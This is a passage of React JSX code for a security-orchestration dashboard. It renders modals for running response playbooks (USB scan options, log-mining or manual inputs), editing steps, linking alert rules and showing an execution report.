                    <span className="text-[9px] font-normal text-amber-300/70">Scans & isolates attached drive</span>
                  </button>

                  <button
                    type="button"
                    onClick={() => setRunInputForm((f) => ({ ...f, usbState: 'DISCONNECTED', usbDisconnected: true }))}
                    className={`c-p p-3 rounded-xl border text-xs font-mono font-bold flex flex-col items-center justify-center gap-1.5 transition ${
                      runInputForm.usbState === 'DISCONNECTED'
                        ? 'border-emerald-500/40 bg-emerald-500/15 text-emerald-300 shadow-[0_0_12px_rgba(16,185,129,0.2)]'
                        : 'border-white/10 bg-white/5 text-slate-400 hover:text-white'
                    }`}
                  >
                    <CheckCircle2 className="h-5 w-5 text-emerald-400" />
                    <span>🚫 USB Drive Disconnected</span>
                    <span className="text-[9px] font-normal text-emerald-300/70">Clean system (No incident ticket)</span>
                  </button>
                </div>

                {runInputForm.usbState === 'DISCONNECTED' ? (
                  <div className="rounded-xl border border-emerald-500/20 bg-emerald-500/8 p-3 text-xs font-mono text-emerald-300">
                    ✓ System USB Bus Clean: Running this scan will query kernel hardware bus, report 0 attached drives, and will <strong>NOT</strong> create an incident ticket.
                  </div>
                ) : (
                  <div>
                    <label className="mb-1 block text-[10px] font-semibold uppercase tracking-[0.22em] text-slate-400">Select Connected USB Hardware *</label>
                    <select
                      value={runInputForm.usbDeviceId}
                      onChange={(e) => {
                        const found = USB_DEVICES_PRESETS.find((u) => u.id === e.target.value);
                        if (found) {
                          setRunInputForm((f) => ({
                            ...f,
                            usbDeviceId: found.id,
                            usbVendor: `${found.vendor} (VID: ${found.vid}, PID: ${found.pid})`,
                          }));
                        }
                      }}
                      className="glass-input w-full px-3 py-2 text-xs font-mono text-white bg-slate-900 cursor-pointer"
                    >
                      {USB_DEVICES_PRESETS.map((dev) => (
                        <option key={dev.id} value={dev.id} className="bg-slate-900 text-white">
                          {dev.vendor} — {dev.status}
                        </option>
                      ))}
                    </select>
                  </div>
                )}
              </div>
            ) : (
              /* Non-USB Mode Switcher: Auto Log-Mining vs Manual Override */
              <>
                <div className="flex rounded-xl border border-white/10 bg-white/5 p-1 text-xs font-mono">
                  <button
                    onClick={() => setRunInputForm((f) => ({ ...f, autoMineLogs: true }))}
                    className={`c-p flex-1 py-2 rounded-lg font-bold flex items-center justify-center gap-1.5 transition ${
                      runInputForm.autoMineLogs
                        ? 'bg-emerald-500/20 text-emerald-300 border border-emerald-500/30 shadow-sm'
                        : 'text-slate-400 hover:text-white'
                    }`}
                  >
                    <Database className="h-3.5 w-3.5 text-emerald-400" /> Auto-Mine Live System Logs (Recommended)
                  </button>
                  <button
                    onClick={() => setRunInputForm((f) => ({ ...f, autoMineLogs: false }))}
                    className={`c-p flex-1 py-2 rounded-lg font-bold flex items-center justify-center gap-1.5 transition ${
                      !runInputForm.autoMineLogs
                        ? 'bg-sky-500/20 text-sky-300 border border-sky-500/30 shadow-sm'
                        : 'text-slate-400 hover:text-white'
                    }`}
                  >
                    <Pencil className="h-3.5 w-3.5 text-sky-400" /> Manual Override Inputs
                  </button>
                </div>

                {runInputForm.autoMineLogs ? (
                  <div className="rounded-xl border border-emerald-500/20 bg-emerald-500/8 p-4 space-y-2 text-xs font-mono">
                    <div className="flex items-center gap-2 text-emerald-300 font-bold">
                      <Zap className="h-4 w-4 text-emerald-400 animate-pulse" /> Automatic Database Log Mining Active
                    </div>
                    <p className="text-slate-300 leading-relaxed">
                      When executed, the SOAR engine will query <strong className="text-white">AuditLog</strong> & <strong className="text-white">SecurityLog</strong> collections in real-time, extract recent offending IP addresses, malicious domains, and malware payloads, and automatically block them in Threat Intel.
                    </p>
                    <div className="text-[10px] text-slate-400 pt-1 border-t border-emerald-500/15">
                      ✓ No manual IP entry required &nbsp;•&nbsp; Reads live database events
                    </div>
                  </div>
                ) : (
                  /* Manual Input Form Overrides */
                  <div className="space-y-3 max-h-[300px] overflow-y-auto pr-1">
                    {category === 'PHISHING' && (
                      <>
                        <div>
                          <label className="mb-1 block text-[10px] font-semibold uppercase tracking-[0.22em] text-slate-400">Sender Email Address *</label>
                          <input
                            value={runInputForm.senderEmail}
                            onChange={(e) => setRunInputForm((f) => ({ ...f, senderEmail: e.target.value }))}
                            className="glass-input w-full px-3.5 py-2 text-xs font-mono text-white"
                          />
                        </div>
                        <div>
                          <label className="mb-1 block text-[10px] font-semibold uppercase tracking-[0.22em] text-slate-400">Paste Email Headers / Body *</label>
                          <textarea
                            value={runInputForm.emailBody}
                            onChange={(e) => setRunInputForm((f) => ({ ...f, emailBody: e.target.value }))}
                            rows="3"
                            className="glass-input w-full px-3.5 py-2 text-xs font-mono text-sky-200"
                          />
                        </div>
                      </>
                    )}

                    {(category === 'SQLI' || category === 'XSS' || category === 'FILE_UPLOAD' || category === 'UNAUTH_ACCESS' || category === 'GENERIC' || category === 'RANSOMWARE' || category === 'PRIVILEGE_ABUSE') && (
                      <div>
                        <label className="mb-1 block text-[10px] font-semibold uppercase tracking-[0.22em] text-slate-400">Target Attacker IP Address</label>
                        <input
                          value={runInputForm.sourceIp}
                          onChange={(e) => setRunInputForm((f) => ({ ...f, sourceIp: e.target.value }))}
                          placeholder="Leave empty to auto-discover IP from system logs"
                          className="glass-input w-full px-3 py-2 text-xs font-mono text-white"
                        />
                      </div>
                    )}
                  </div>
                )}
              </>
            )}

            <div className="flex gap-2 pt-2 border-t border-white/8">
              <button
                onClick={() => setShowRunInputModal(false)}
                className="c-p sc-button-secondary flex-1 px-4 py-2.5 text-xs font-semibold"
              >
                Cancel
              </button>
              <button
                onClick={executePlaybookWithParams}
                className="c-p flex-1 rounded-xl border border-emerald-500/40 bg-emerald-500/20 px-4 py-2.5 text-xs font-extrabold text-emerald-300 hover:bg-emerald-500/30 transition flex items-center justify-center gap-1.5 shadow-[0_0_12px_rgba(16,185,129,0.2)]"
              >
                <Play className="h-3.5 w-3.5 fill-emerald-300" /> Execute Live SOAR Run
              </button>
            </div>
          </div>
        </div>
      )}

      {/* ── Step Editor Modal ──────────────────────────────────────────────── */}
      {showStepEditor && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/60 p-4 backdrop-blur-sm">
          <div className="sc-modal relative max-h-[85vh] w-full max-w-lg overflow-y-auto p-6 sc-scale-in">
            <button onClick={() => setShowStepEditor(false)} className="c-p absolute right-4 top-4 text-slate-400 hover:text-white transition">
              <X className="h-5 w-5" />
            </button>
            <h3 className="mb-5 flex items-center gap-2 text-base font-bold text-white">
              {editingStep ? <Pencil className="h-4 w-4 text-sky-300" /> : <Plus className="h-4 w-4 text-sky-300" />}
              {editingStep ? 'Edit Response Step' : 'Add Specialized Step'}
            </h3>

            <div className="space-y-4">
              <div>
                <p className="mb-2 text-[10px] font-semibold uppercase tracking-[0.22em] text-slate-400">Step Action Type</p>
                <div className="grid grid-cols-2 gap-2 max-h-[160px] overflow-y-auto pr-1">
                  {STEP_TYPES.map(({ type, label, Icon, color }) => {
                    const style = STEP_TYPE_STYLES[color] || STEP_TYPE_STYLES.purple;
                    const isSelected = stepForm.type === type;
                    return (
                      <button
                        key={type}
                        onClick={() => setStepForm((f) => ({ ...f, type }))}
                        className={`c-p flex items-center gap-1.5 rounded-xl border px-2.5 py-2 text-[10px] font-bold font-mono transition text-left ${
                          isSelected
                            ? `${style.text} ${style.border} ${style.bg}`
                            : 'border-white/8 bg-white/3 text-slate-400 hover:border-white/15 hover:text-slate-200'
                        }`}
                      >
                        <Icon className="h-3 w-3 shrink-0" /> <span className="truncate">{label}</span>
                      </button>
                    );
                  })}
                </div>
              </div>

              <div>
                <label className="mb-1 block text-[10px] font-semibold uppercase tracking-[0.22em] text-slate-400">Step Title *</label>
                <input
                  value={stepForm.title}
                  onChange={(e) => setStepForm((f) => ({ ...f, title: e.target.value }))}
                  placeholder="e.g. Inspect USB Vendor VID/PID"
                  className="glass-input w-full px-4 py-2.5 text-sm"
                />
              </div>

              <div>
                <label className="mb-1 block text-[10px] font-semibold uppercase tracking-[0.22em] text-slate-400">Description</label>
                <textarea
                  value={stepForm.description}
                  onChange={(e) => setStepForm((f) => ({ ...f, description: e.target.value }))}
                  rows="3"
                  placeholder="Describe the automated action performed in this step..."
                  className="glass-input w-full px-4 py-2.5 text-sm"
                />
              </div>

              <div>
                <label className="mb-1 block text-[10px] font-semibold uppercase tracking-[0.22em] text-slate-400">Action Notes (optional)</label>
                <textarea
                  value={stepForm.actionNotes || ''}
                  onChange={(e) => setStepForm((f) => ({ ...f, actionNotes: e.target.value }))}
                  rows="2"
                  placeholder="API endpoint, Slack channel, runbook link..."
                  className="glass-input w-full px-4 py-2.5 text-xs"
                />
              </div>

              <div className="flex gap-2 pt-1">
                <button onClick={() => setShowStepEditor(false)} className="c-p sc-button-secondary flex-1 px-4 py-2.5 text-xs font-semibold uppercase tracking-widest">
                  Cancel
                </button>
                <button onClick={handleSaveStep} className="c-p sc-button-primary flex-1 px-4 py-2.5 text-xs font-semibold uppercase tracking-widest">
                  <Check className="h-3.5 w-3.5" /> {editingStep ? 'Update Step' : 'Add Step'}
                </button>
              </div>
            </div>
          </div>
        </div>
      )}

      {/* ── Alert Rule Link Modal ──────────────────────────────────────────── */}
      {showLinkModal && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/60 p-4 backdrop-blur-sm">
          <div className="sc-modal relative max-h-[85vh] w-full max-w-2xl overflow-y-auto p-6 sc-scale-in">
            <button onClick={() => setShowLinkModal(false)} className="c-p absolute right-4 top-4 text-slate-400 hover:text-white transition">
              <X className="h-5 w-5" />
            </button>
            <h3 className="mb-1 flex items-center gap-2 text-base font-bold text-white">
              <Link2 className="h-4 w-4 text-sky-300" /> Link to Alert Rule
            </h3>
            <p className="mb-5 text-xs font-mono text-slate-500">
              Select an alert rule to associate with this playbook for automatic SOAR response triggering.
            </p>

            {pbMeta.linkedAlertRuleId && (
              <button
                onClick={() => handleLinkRule(null)}
                className="c-p mb-4 flex w-full items-center gap-2 rounded-xl border border-red-500/20 bg-red-500/8 px-4 py-3 text-xs font-mono text-red-400 hover:bg-red-500/15 transition"
              >
                <Link2Off className="h-3.5 w-3.5" /> Unlink current rule ({linkedRule?.name})
              </button>
            )}

            <div className="grid grid-cols-1 gap-3 sm:grid-cols-2">
              {alertRules.map((rule) => {
                const isLinked = pbMeta.linkedAlertRuleId === rule.id;
                return (
                  <button
                    key={rule.id}
                    onClick={() => handleLinkRule(rule.id)}
                    className={`c-p flex flex-col gap-2 rounded-2xl border p-4 text-left transition hover:bg-white/5 ${
                      isLinked
                        ? 'border-sky-500/40 bg-sky-500/8 ring-1 ring-sky-400/20'
                        : 'border-white/8 bg-white/3'
                    }`}
                  >
                    <div className="flex items-center justify-between gap-2">
                      <SeverityBadge severity={rule.severity} />
                      {isLinked && <Check className="h-3.5 w-3.5 text-sky-400" />}
                    </div>
                    <p className="text-sm font-semibold text-white">{rule.name}</p>
                    <p className="text-[10px] font-mono text-slate-500 leading-relaxed">{rule.condition}</p>
                  </button>
                );
              })}
            </div>

            <div className="mt-4 pt-4 border-t border-white/8">
              <button onClick={() => setShowLinkModal(false)} className="c-p sc-button-secondary w-full px-4 py-2.5 text-xs font-semibold">
                Close
              </button>
            </div>
          </div>
        </div>
      )}

      {/* ── Live Backend Execution Report Modal ──────────────────────────── */}
      {runResult && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/75 p-4 backdrop-blur-md">
          <div className="sc-modal relative w-full max-w-3xl overflow-hidden p-6 sc-scale-in space-y-4">
            <button
              onClick={() => setRunResult(null)}
              className="c-p absolute right-4 top-4 text-slate-400 hover:text-white transition"
            >
              <X className="h-5 w-5" />
            </button>

            <div className="flex items-center gap-3">
              <div className="flex h-10 w-10 items-center justify-center rounded-2xl border border-emerald-500/30 bg-emerald-500/10 text-emerald-400 shadow-[0_0_15px_rgba(16,185,129,0.2)]">
                <Play className="h-5 w-5 fill-emerald-400" />
              </div>
              <div>
                <div className="flex items-center gap-2">
                  <span className="sc-badge border-emerald-500/30 bg-emerald-500/10 text-emerald-300">
                    <CheckCircle2 className="h-3 w-3" /> Live Backend Operations Report
                  </span>
                  <span className="font-mono text-xs text-slate-400">{runResult.executionTimeMs} ms</span>
                </div>
                <h3 className="mt-1 text-lg font-extrabold text-white">{runResult.playbookName}</h3>
              </div>
            </div>

            {/* Side-effects summary cards */}
            <div className="grid grid-cols-1 sm:grid-cols-3 gap-3">
              <div className="rounded-xl border border-blue-500/20 bg-blue-500/8 p-3 text-left">
                <p className="text-[10px] font-mono uppercase text-blue-300 font-bold">Incident Ticket Status</p>
                <p className="text-sm font-extrabold text-white mt-0.5 truncate">
                  {runResult.createdIncidentId ? `Ticket #${runResult.createdIncidentId.substring(0, 8)}` : 'Clean System (No Ticket)'}
                </p>
                <p className="text-[9px] font-mono text-slate-400 mt-0.5">Stored in Incident DB</p>
              </div>

              <div className="rounded-xl border border-red-500/20 bg-red-500/8 p-3 text-left">
                <p className="text-[10px] font-mono uppercase text-red-300 font-bold">Threat Intel Blocked</p>
                <p className="text-sm font-extrabold text-white mt-0.5 truncate">
                  {runResult.blockedIocValue ? runResult.blockedIocValue : 'N/A (No Block Step)'}
                </p>
                <p className="text-[9px] font-mono text-slate-400 mt-0.5">Added to Threat Intel DB</p>
              </div>

              <div className="rounded-xl border border-purple-500/20 bg-purple-500/8 p-3 text-left">
                <p className="text-[10px] font-mono uppercase text-purple-300 font-bold">Audit Trail Records</p>
                <p className="text-sm font-extrabold text-white mt-0.5">
                  {runResult.auditLogsLogged || runResult.totalSteps} Logs Recorded
                </p>
                <p className="text-[9px] font-mono text-slate-400 mt-0.5">Persisted in Audit DB</p>
              </div>
            </div>

            {/* Extracted Triage Summary if available */}
            {runResult.extractedSummary && (
              <div className="rounded-xl border border-sky-500/20 bg-sky-500/10 p-3 text-xs font-mono text-sky-200">
                <strong className="text-sky-400 uppercase text-[10px] font-bold tracking-widest block mb-1 font-sans">Live Hardware & Telemetry Summary:</strong>
                {runResult.extractedSummary}
              </div>
            )}

            {/* Step execution stream */}
            <div className="space-y-2 max-h-[190px] overflow-y-auto pr-1">
              <p className="text-[10px] font-bold uppercase tracking-widest text-slate-500">Live Step Execution Stream</p>
              {(runResult.executedSteps || []).slice(0, runVisibleSteps).map((step) => {
                return (
                  <div
                    key={step.stepId || step.stepIndex}
                    className="flex items-center justify-between rounded-xl border border-emerald-500/20 bg-emerald-500/5 px-3.5 py-2 text-xs sc-fade-in"
                  >
                    <div className="flex items-center gap-2.5 min-w-0">
                      <CheckCircle2 className="h-4 w-4 shrink-0 text-emerald-400" />
                      <span className="font-mono font-bold text-slate-300 shrink-0">Step {step.stepIndex}:</span>
                      <span className="font-semibold text-white truncate">{step.title}</span>
                    </div>
                    <div className="flex items-center gap-3 font-mono text-[10px] shrink-0">
                      <span className="text-emerald-400 font-bold">EXECUTED</span>
                      <span className="text-slate-500">{step.durationMs}ms</span>
                    </div>
                  </div>
                );
              })}
            </div>

            {/* Console output */}
            <div>
              <p className="mb-1.5 flex items-center gap-1.5 text-[10px] font-bold uppercase tracking-widest text-slate-400">
                <Terminal className="h-3.5 w-3.5 text-sky-400" /> Operations Console Log
              </p>
              <div className="rounded-xl border border-white/10 bg-[#050a14] p-3 font-mono text-xs text-sky-300 space-y-1.5 max-h-[140px] overflow-y-auto">
                {(runResult.executedSteps || []).slice(0, runVisibleSteps).map((step) => (
                  <div key={step.stepId || step.stepIndex} className="leading-relaxed">
                    <span className="text-slate-500">[{new Date().toLocaleTimeString()}]</span>{' '}
                    <span className="text-emerald-400 font-bold">[{step.type}]</span> — {step.logOutput}
                  </div>
                ))}
                {runVisibleSteps < (runResult.executedSteps?.length || 0) && (
                  <div className="animate-pulse text-slate-500 italic">Executing next backend step...</div>
                )}
              </div>
            </div>

            <div className="pt-2 flex justify-end">
              <button
                onClick={() => setRunResult(null)}
                className="sc-button-primary px-5 py-2 text-xs font-semibold"
              >
                Close Report
              </button>
            </div>
          </div>
        </div>
      )}

    </div>
  );
}
